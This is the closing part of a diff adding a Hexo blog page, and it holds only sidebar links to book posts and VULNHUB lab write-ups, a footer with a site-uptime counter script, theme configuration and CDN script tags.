+
+    <span><a href="/2023/06/30/BOOK/54%E3%80%8A%E7%AE%80%C2%B7%E7%88%B1%E3%80%8B%E5%A4%8F%E6%B4%9B%E8%92%82%C2%B7%E5%8B%83%E6%9C%97%E7%89%B9/" title="《简·爱》夏洛蒂·勃朗特">《简·爱》夏洛蒂·勃朗特</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/16%E3%80%8A%E6%BF%92%E6%AD%BB%E7%BB%8F%E5%8E%86%E3%80%8B%E7%8E%9B%E4%B8%BD%E8%90%A8/" title="《濒死经历》玛丽萨">《濒死经历》玛丽萨</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/02/VULNHUB/115%20THALES/" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/" title="《论上帝的隐秘》库撒·尼古拉">《论上帝的隐秘》库撒·尼古拉</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/02/VULNHUB/118%20JANGOW/" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/07/04/SAFE/2 WEB通用漏洞/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
